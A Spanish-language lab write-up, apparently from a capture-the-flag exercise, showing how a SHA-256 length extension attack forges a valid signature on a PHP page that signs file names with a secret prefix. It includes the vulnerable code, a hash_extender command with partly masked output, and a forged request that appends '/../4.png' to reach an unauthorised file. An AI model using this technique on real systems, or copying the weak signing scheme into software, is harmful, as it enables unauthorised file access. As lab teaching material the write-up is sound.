---
layout: apunte
title: "4. Practical - Attacking Signatures"
---

En esta tarea, aprenderás cómo un ataque de length extension puede usarse para añadir información mientras sigue generando una firma válida. Este acercamiento se aprovecha de las funciones de hasheo como SHA-256, que son vulnerables a ataques de length extension cuando se usan inadecuadamente.

Antes de continuar recomendamos que instales la herramienta [hash_extender](https://github.com/iagox86/hash_extender).

---------------------------------------
<h2>El Escenario</h2>
Navega hasta http://lea.thm/labs/lab1/.

!**Pasted image 20260315222312.png**

Haz click en el botón de ver detalles de cualquier producto listado en la página. Como puedes ver en la próxima página, el `product.php` usa el parámetro signature con el parámetro file para comprobar la legitimidad del archivo dado en el parámetro file.

!**Pasted image 20260315222432.png**

----------------------------------------------
<h2>El Código Vulnerable</h2>
El código PHP de aquí debajo usa el hash SHA-256 para firmar archivos para la aplicación. Esta firma intenta verificar que sólo archivos autorizados puedan ser accedidos, previniendo acceder a archivos no autorizados.

```php
require_once("secrets.php");

function sign($str, $secret) {
    return hash('sha256', $secret . $str);
}

// Retrieve and sanitize file and signature parameters
$file = isset($_GET['file']) ? $_GET['file'] : '';
$signature = isset($_GET['signature']) ? $_GET['signature'] : '';

if ($file && $signature) {
    // Validate the signature
    if (sign($file, $SECRET) === $signature) {

        // Sanitize the filename, force UTF-8 encoding, and remove malicious characters
        $file = mb_convert_encoding($file, 'UTF-8', 'binary');
        $file = preg_replace('/[^\w\/.]/', '', $file);

        // Set the file path in the images folder
        $filePath = __DIR__ . "/images/" . basename($file);

        // Check if the file exists and if it matches a defined product
        if (file_exists($filePath)) {
            $product = $products[$file];
						// Display product details
```

Aquí está como el código vulnerable funciona:

1. El servidor genera un hash SHA-256 firmando el archivo con la clave secreta.
2. Luego valida los parámetros de archivo y la firma de una petición GET para asegurar que la petición es auténtica.
3. Si la firma coincide, el servidor devuelve y muestra los detalles del producto.

-------------------------------
<h2>Objetivo</h2>
El objetivo aquí es añadir información adicional (`/../4.png`) al parámetro `file` (por ejemplo `"1.png"`) para acceder a un archivo no autorizado mientras se genera una firma válida SHA-256 para la ruta modificada.

-------------------------------------
<h2>Usar Hash Extender Para el Ataque</h2>
Para conseguir esto, usaremos el Hash Extender para modificar la ruta del archivo original y crear una nueva firma. El comando de abajo muestra cómo ejecutar este ataque:

```bash
./hash_extender --data 1.png --signature 02d101c0ac898f9e69b7d6ec1f84a7f0d784e59bbbe057acb4cef2cf93621ba9 --append /../4.png --out-data-format=html
Type: sha256
Secret length: 8
New signature: XXXXXXXXXXXXXd0a9d3d1765d3e83dd34b0b0242fa7e1567f085a5XXXXXXXXXX
New string: XXXXXXX%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00h%2f%2e%XXXXXXXXXXX
```

Explicación del comando:

- `--data`: Especifica la información original a hashear (`"1.png"`).
- `--signature`: Da el hash original para el mensaje original.
- `--append`: Añade la nueva información (`"/../4.png"`).
- `--out-data-format=html`: Formatea el output en HTML para simular una petición web modificada.

Ten en cuenta que en algunos casos la longitud del secreto varía dependiendo de la frase secreta usada por el servidor. Por ello, a veces es importante hacer fuerza bruta de la firma usando una longitud de secreto incremental.

!**Pasted image 20260315230258.png**

Con esta nueva firma, podemos mandar peticiones falsificadas para acceder a `"4.png"` en lugar de `"1.png"`. Esta petición puede verse así:

```plaintext
GET /product.php?file=1%2epng%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00h%2f%2e%2e%2f4%2epng&signature=a9f7878a39b10d0a9d3d1765d3e83dd34b0b0242fa7e1567f085a5a9c467337a
```

El servidor, confiando en la firma, validará el hash y permitirá el acceso a `"4.png"` porque la nueva firma coincide con la ruta añadida.

!**Pasted image 20260315230450.png**

Dándonos así la flag.

!**Pasted image 20260315230503.png**

